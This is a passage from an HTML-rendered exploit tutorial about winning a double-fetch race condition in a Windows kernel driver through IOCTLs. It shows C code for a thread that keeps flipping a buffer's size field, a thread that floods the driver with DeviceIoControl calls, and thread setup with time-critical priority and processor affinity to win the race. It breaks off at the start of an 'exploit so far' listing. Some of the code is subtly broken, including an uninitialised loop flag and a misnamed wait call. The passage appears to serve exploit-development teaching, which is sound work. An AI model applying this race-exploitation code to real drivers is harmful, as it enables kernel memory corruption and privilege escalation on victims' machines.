<a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="w">    </span><span class="n">PUSER_DOUBLE_FETCH</span><span class="w">  </span><span class="n">DoubleFetch</span><span class="p">;</span><span class="w"> </span><span class="c1">// (2)</span>
<a id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="p">}</span><span class="w"> </span><span class="n">IO_THREAD_PARAM</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">PIO_THREAD_PARAM</span><span class="p">;</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<ol>
<li>This will store the handle to the driver which we'll need to issue <abbr title="Input Output Control">IOCTLs</abbr>.</li>
<li>This is a pointer to our DoubleFetch buffer that we'll use for the exploit.</li>
</ol>
<p>The next step is for us to create a thread specifically for updating the structures size member. First we'll create a new function that's sole purpose is modifying the size value of the structure. The function is fairly simple, one thing you might be unfamiliar with is the use of <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessornumber"><code>GetCurrentProcessorNumber()</code></a> this is a function definied in <code>processthreadsapi.h</code> this is mostly just to help us with debugging during exploitation.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">A thread to change the UserBuffer->Size member</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-11-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-11-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-11-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-11-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-11-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-11-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-11-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-11-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-11-10">10</a></span>
<span class="normal"><a href="#__codelineno-11-11">11</a></span>
<span class="normal"><a href="#__codelineno-11-12">12</a></span>
<span class="normal"><a href="#__codelineno-11-13">13</a></span>
<span class="normal"><a href="#__codelineno-11-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">ChangeSizeThread</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">Size</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">ExploitSuccess</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-11-5" name="__codelineno-11-5"></a>
<a id="__codelineno-11-6" name="__codelineno-11-6"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Changing size on processor %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessorNumber</span><span class="p">());</span><span class="w"></span>
<a id="__codelineno-11-7" name="__codelineno-11-7"></a>
<a id="__codelineno-11-8" name="__codelineno-11-8"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ExploitSuccess</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-11-9" name="__codelineno-11-9"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-11-10" name="__codelineno-11-10"></a><span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">Size</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="mh">0x00000808</span><span class="p">;</span><span class="w">    </span><span class="c1">// 2056 bytes</span>
<a id="__codelineno-11-11" name="__codelineno-11-11"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-11-12" name="__codelineno-11-12"></a>
<a id="__codelineno-11-13" name="__codelineno-11-13"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-11-14" name="__codelineno-11-14"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Next we'll need to create a function that will solely send our <code>DeviceIoControl</code> request this is important because we won't win the race first time and we need to be able to keep sending requests for every time we try to update the size of the struct member.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">A thread to issue IOCTL requests for the exploit</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-12-10">10</a></span>
<span class="normal"><a href="#__codelineno-12-11">11</a></span>
<span class="normal"><a href="#__codelineno-12-12">12</a></span>
<span class="normal"><a href="#__codelineno-12-13">13</a></span>
<span class="normal"><a href="#__codelineno-12-14">14</a></span>
<span class="normal"><a href="#__codelineno-12-15">15</a></span>
<span class="normal"><a href="#__codelineno-12-16">16</a></span>
<span class="normal"><a href="#__codelineno-12-17">17</a></span>
<span class="normal"><a href="#__codelineno-12-18">18</a></span>
<span class="normal"><a href="#__codelineno-12-19">19</a></span>
<span class="normal"><a href="#__codelineno-12-20">20</a></span>
<span class="normal"><a href="#__codelineno-12-21">21</a></span>
<span class="normal"><a href="#__codelineno-12-22">22</a></span>
<span class="normal"><a href="#__codelineno-12-23">23</a></span>
<span class="normal"><a href="#__codelineno-12-24">24</a></span>
<span class="normal"><a href="#__codelineno-12-25">25</a></span>
<span class="normal"><a href="#__codelineno-12-26">26</a></span>
<span class="normal"><a href="#__codelineno-12-27">27</a></span>
<span class="normal"><a href="#__codelineno-12-28">28</a></span>
<span class="normal"><a href="#__codelineno-12-29">29</a></span>
<span class="normal"><a href="#__codelineno-12-30">30</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">IoControlThread</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">IoThreadParam</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-12-2" name="__codelineno-12-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="w">    </span><span class="n">BOOL</span><span class="w">    </span><span class="n">ExploitSuccess</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-4" name="__codelineno-12-4"></a>
<a id="__codelineno-12-5" name="__codelineno-12-5"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w">              </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-6" name="__codelineno-12-6"></a><span class="w">    </span><span class="n">PIO_THREAD_PARAM</span><span class="w">    </span><span class="n">IoControlThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-7" name="__codelineno-12-7"></a><span class="w">    </span><span class="n">PUSER_DOUBLE_FETCH</span><span class="w">  </span><span class="n">UserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-8" name="__codelineno-12-8"></a>
<a id="__codelineno-12-9" name="__codelineno-12-9"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">BytesReturned</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-10" name="__codelineno-12-10"></a><span class="w">    </span><span class="kt">int</span><span class="w">     </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-11" name="__codelineno-12-11"></a>
<a id="__codelineno-12-12" name="__codelineno-12-12"></a><span class="w">    </span><span class="cm">/* Get pointer to thread parameter structure */</span><span class="w"></span>
<a id="__codelineno-12-13" name="__codelineno-12-13"></a><span class="w">    </span><span class="n">IoControlThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PIO_THREAD_PARAM</span><span class="p">)</span><span class="n">IoThreadParam</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-14" name="__codelineno-12-14"></a>
<a id="__codelineno-12-15" name="__codelineno-12-15"></a><span class="w">    </span><span class="cm">/* Get thread paremeter structure members  */</span><span class="w"></span>
<a id="__codelineno-12-16" name="__codelineno-12-16"></a><span class="w">    </span><span class="n">UserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IoControlThreadParam</span><span class="o">-&gt;</span><span class="n">DoubleFetch</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-17" name="__codelineno-12-17"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IoControlThreadParam</span><span class="o">-&gt;</span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-18" name="__codelineno-12-18"></a>
<a id="__codelineno-12-19" name="__codelineno-12-19"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Sending IOCTL on processor %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessorNumber</span><span class="p">());</span><span class="w"></span>
<a id="__codelineno-12-20" name="__codelineno-12-20"></a>
<a id="__codelineno-12-21" name="__codelineno-12-21"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ExploitSuccess</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-12-22" name="__codelineno-12-22"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-12-23" name="__codelineno-12-23"></a><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="n">UserDoubleFetch</span><span class="p">,</span><span class="w"> </span><span class="mi">3000</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-12-24" name="__codelineno-12-24"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-12-25" name="__codelineno-12-25"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to send IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-12-26" name="__codelineno-12-26"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-12-27" name="__codelineno-12-27"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-12-28" name="__codelineno-12-28"></a>
<a id="__codelineno-12-29" name="__codelineno-12-29"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-12-30" name="__codelineno-12-30"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Now that we've created a function to change the size value and a function to send the <abbr title="Input Output Control">IOCTLs</abbr> to the driver we'll need to create threads for those functions respectively. In addition to creating the threads we'll also want to do some basic thread management in that we'll need to change the thread priority via the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority"><code>SetThreadPriority</code></a> function, doing this enables us to more easily win the race as we tell the scheduler to place our threads at the top of the order of execution.</p>
<p>Additionally, we'll also want to set the threads affinity mask via the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setthreadaffinitymask"><code>SetThreadAffinityMask</code></a> function. This function allows us to tell the scheduler exactly <strong>what</strong> processor our thread should run on. It is worth noting that we should be careful when manually setting the Affinity mask as noted in <a href="https://stackoverflow.com/a/5919745">this answer</a> on StackOverflow. In order to simulate the behaviour described in that answer, i.e, setting the affinity mask from outside the thread and then shifting by 1 each round, we'll put our code inside a loop with the value of our max number of processors as our stopping point.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Initialising thread structure and creating threads to run for exploit</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-13-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-13-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-13-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-13-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-13-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-13-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-13-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-13-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-13-10">10</a></span>
<span class="normal"><a href="#__codelineno-13-11">11</a></span>
<span class="normal"><a href="#__codelineno-13-12">12</a></span>
<span class="normal"><a href="#__codelineno-13-13">13</a></span>
<span class="normal"><a href="#__codelineno-13-14">14</a></span>
<span class="normal"><a href="#__codelineno-13-15">15</a></span>
<span class="normal"><a href="#__codelineno-13-16">16</a></span>
<span class="normal"><a href="#__codelineno-13-17">17</a></span>
<span class="normal"><a href="#__codelineno-13-18">18</a></span>
<span class="normal"><a href="#__codelineno-13-19">19</a></span>
<span class="normal"><a href="#__codelineno-13-20">20</a></span>
<span class="normal"><a href="#__codelineno-13-21">21</a></span>
<span class="normal"><a href="#__codelineno-13-22">22</a></span>
<span class="normal"><a href="#__codelineno-13-23">23</a></span>
<span class="normal"><a href="#__codelineno-13-24">24</a></span>
<span class="normal"><a href="#__codelineno-13-25">25</a></span>
<span class="normal"><a href="#__codelineno-13-26">26</a></span>
<span class="normal"><a href="#__codelineno-13-27">27</a></span>
<span class="normal"><a href="#__codelineno-13-28">28</a></span>
<span class="normal"><a href="#__codelineno-13-29">29</a></span>
<span class="normal"><a href="#__codelineno-13-30">30</a></span>
<span class="normal"><a href="#__codelineno-13-31">31</a></span>
<span class="normal"><a href="#__codelineno-13-32">32</a></span>
<span class="normal"><a href="#__codelineno-13-33">33</a></span>
<span class="normal"><a href="#__codelineno-13-34">34</a></span>
<span class="normal"><a href="#__codelineno-13-35">35</a></span>
<span class="normal"><a href="#__codelineno-13-36">36</a></span>
<span class="normal"><a href="#__codelineno-13-37">37</a></span>
<span class="normal"><a href="#__codelineno-13-38">38</a></span>
<span class="normal"><a href="#__codelineno-13-39">39</a></span>
<span class="normal"><a href="#__codelineno-13-40">40</a></span>
<span class="normal"><a href="#__codelineno-13-41">41</a></span>
<span class="normal"><a href="#__codelineno-13-42">42</a></span>
<span class="normal"><a href="#__codelineno-13-43">43</a></span>
<span class="normal"><a href="#__codelineno-13-44">44</a></span>
<span class="normal"><a href="#__codelineno-13-45">45</a></span>
<span class="normal"><a href="#__codelineno-13-46">46</a></span>
<span class="normal"><a href="#__codelineno-13-47">47</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="w">    </span><span class="cm">/* Allocate IO_THREAD_PARAM struct */</span><span class="w"></span>
<a id="__codelineno-13-2" name="__codelineno-13-2"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PIO_THREAD_PARAM</span><span class="o">*</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">IO_THREAD_PARAM</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">IoThreadParam</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to allocate memory for IO thread!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-13-7" name="__codelineno-13-7"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-13-8" name="__codelineno-13-8"></a>
<a id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="w">    </span><span class="cm">/* Initialise IO_THREAD_PARAM struct members */</span><span class="w"></span>
<a id="__codelineno-13-10" name="__codelineno-13-10"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="o">-&gt;</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-13-11" name="__codelineno-13-11"></a><span class="w">    </span><span class="n">IoThreadParam</span><span class="o">-&gt;</span><span class="n">DoubleFetch</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-13-12" name="__codelineno-13-12"></a>
<a id="__codelineno-13-13" name="__codelineno-13-13"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">NumProcessors</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-13-14" name="__codelineno-13-14"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-13-15" name="__codelineno-13-15"></a><span class="w">        </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">ChangeSizeHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">ChangeSizeThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">PtrDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-16" name="__codelineno-13-16"></a><span class="w">        </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">IoControlHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">IoControlThread</span><span class="p">,</span><span class="w"> </span><span class="n">IoThreadParam</span><span class="p">,</span><span class="w"> </span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-17" name="__codelineno-13-17"></a>
<a id="__codelineno-13-18" name="__codelineno-13-18"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">SetThreadPriority</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">,</span><span class="w"> </span><span class="n">THREAD_PRIORITY_TIME_CRITICAL</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">SetThreadPriority</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">,</span><span class="w"> </span><span class="n">THREAD_PRIORITY_TIME_CRITICAL</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-13-19" name="__codelineno-13-19"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-13-20" name="__codelineno-13-20"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to set thread priority to highest!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-21" name="__codelineno-13-21"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-13-22" name="__codelineno-13-22"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Set ChangeSizeThread Priority to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetThreadPriority</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-13-23" name="__codelineno-13-23"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Set IoControlThread Priority to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetThreadPriority</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">));</span><span class="w"></span>
<a id="__codelineno-13-24" name="__codelineno-13-24"></a>
<a id="__codelineno-13-25" name="__codelineno-13-25"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">SetThreadAffinityMask</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">SetThreadAffinityMask</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-13-26" name="__codelineno-13-26"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-13-27" name="__codelineno-13-27"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to set thread affinity!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-28" name="__codelineno-13-28"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-13-29" name="__codelineno-13-29"></a>
<a id="__codelineno-13-30" name="__codelineno-13-30"></a><span class="w">        </span><span class="n">ResumeThread</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-31" name="__codelineno-13-31"></a><span class="w">        </span><span class="n">ResumeThread</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-32" name="__codelineno-13-32"></a>
<a id="__codelineno-13-33" name="__codelineno-13-33"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">WaitForMultipleObjects</span><span class="p">(</span><span class="n">NumProcessors</span><span class="p">,</span><span class="w"> </span><span class="n">ChangeSizeHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">,</span><span class="w"> </span><span class="n">INFINITE</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-13-34" name="__codelineno-13-34"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-13-35" name="__codelineno-13-35"></a><span class="w">            </span><span class="n">TerminateThread</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">,</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-36" name="__codelineno-13-36"></a><span class="w">            </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">ChangeSizeHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-37" name="__codelineno-13-37"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Terminated change size thread!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-38" name="__codelineno-13-38"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-13-39" name="__codelineno-13-39"></a>
<a id="__codelineno-13-40" name="__codelineno-13-40"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">WaitForSingleObjects</span><span class="p">(</span><span class="n">NumProcessors</span><span class="p">,</span><span class="w"> </span><span class="n">IoControlHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">,</span><span class="w"> </span><span class="n">INFINITE</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-13-41" name="__codelineno-13-41"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-13-42" name="__codelineno-13-42"></a><span class="w">            </span><span class="n">TerminateThread</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">,</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-43" name="__codelineno-13-43"></a><span class="w">            </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">IoControlHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-44" name="__codelineno-13-44"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Terminated IO control thread!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-45" name="__codelineno-13-45"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-13-46" name="__codelineno-13-46"></a>
<a id="__codelineno-13-47" name="__codelineno-13-47"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>We've done a lot of work up to this point, let's take a look at the code altogether to recap where we've got to. <strong>I realise this code is quite daunting, at the end of the post I'll put a link to my full POC which I'll litter with comments.</strong></p>
<h3 id="exploit-summary-0x2">Exploit Summary 0x2<a class="headerlink" href="#exploit-summary-0x2" title="Permanent link">&para;</a></h3>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Exploit so far</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">  1</a></span>
<span class="normal"><a href="#__codelineno-14-2">  2</a></span>
<span class="normal"><a href="#__codelineno-14-3">  3</a></span>
<span class="normal"><a href="#__codelineno-14-4">  4</a></span>
<span class="normal"><a href="#__codelineno-14-5">  5</a></span>
<span class="normal"><a href="#__codelineno-14-6">  6</a></span>
<span class="normal"><a href="#__codelineno-14-7">  7</a></span>
<span class="normal"><a href="#__codelineno-14-8">  8</a></span>
<span class="normal"><a href="#__codelineno-14-9">  9</a></span>
<span class="normal"><a href="#__codelineno-14-10"> 10</a></span>
<span class="normal"><a href="#__codelineno-14-11"> 11</a></span>
<span class="normal"><a href="#__codelineno-14-12"> 12</a></span>
<span class="normal"><a href="#__codelineno-14-13"> 13</a></span>
<span class="normal"><a href="#__codelineno-14-14"> 14</a></span>
<span class="normal"><a href="#__codelineno-14-15"> 15</a></span>
<span class="normal"><a href="#__codelineno-14-16"> 16</a></span>
<span class="normal"><a href="#__codelineno-14-17"> 17</a></span>
<span class="normal"><a href="#__codelineno-14-18"> 18</a></span>
<span class="normal"><a href="#__codelineno-14-19"> 19</a></span>
<span class="normal"><a href="#__codelineno-14-20"> 20</a></span>
<span class="normal"><a href="#__codelineno-14-21"> 21</a></span>
<span class="normal"><a href="#__codelineno-14-22"> 22</a></span>
<span class="normal"><a href="#__codelineno-14-23"> 23</a></span>
<span class="normal"><a href="#__codelineno-14-24"> 24</a></span>
<span class="normal"><a href="#__codelineno-14-25"> 25</a></span>
<span class="normal"><a href="#__codelineno-14-26"> 26</a></span>
<span class="normal"><a href="#__codelineno-14-27"> 27</a></span>
<span class="normal"><a href="#__codelineno-14-28"> 28</a></span>
<span class="normal"><a href="#__codelineno-14-29"> 29</a></span>
<span class="normal"><a href="#__codelineno-14-30"> 30</a></span>
